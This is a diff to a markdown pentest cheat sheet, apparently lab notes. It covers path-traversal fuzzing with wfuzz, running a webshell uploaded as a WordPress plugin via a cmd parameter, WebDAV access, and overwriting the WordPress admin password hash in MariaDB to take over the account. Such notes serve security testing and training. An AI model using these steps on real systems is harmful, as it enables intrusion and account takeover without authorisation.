@@ -16,9 +16,7 @@ Then use the list to find out which ones work:
 
 Find out how many characters a wrong request is, then filter those out:
 > wfuzz -u http://10.10.10.10:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt -hh 1000
-
 ```
-
 
 ###### PayloadsAllTheThings
 ```
@@ -42,6 +40,11 @@ https://pentestmonkey.net/category/cheat-sheet/sql-injection
 https://blog.cobalt.io/a-pentesters-guide-to-sql-injection-sqli-16fd570c3532
 ```
 
+###### WebDAV
+```
+> cadaver http://10.10.10.10/
+```
+
 ###### Wordpress Panel
 ```
 Upload webshell in a plugin
@@ -51,4 +54,16 @@ Upload webshell in a plugin
 
 Upload the ZIP as a plugin. Then run the webshell:
 > curl http://10.10.10.10/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
+```
+
+###### Example changing a wordpress password in MariaDB
+```
+https://codebeautify.org/wordpress-password-hash-generator
+"password" $P$Bp430d4U/90Jjw8evTcM4ShXGZZkdv0
+
+> UPDATE wp_users SET user_pass = "$P$Bp430d4U/90Jjw8evTcM4ShXGZZkdv0" WHERE ID=1;
+then verify with:
+> select * from wp_users;
+
+Then login with username:"password"
 ```
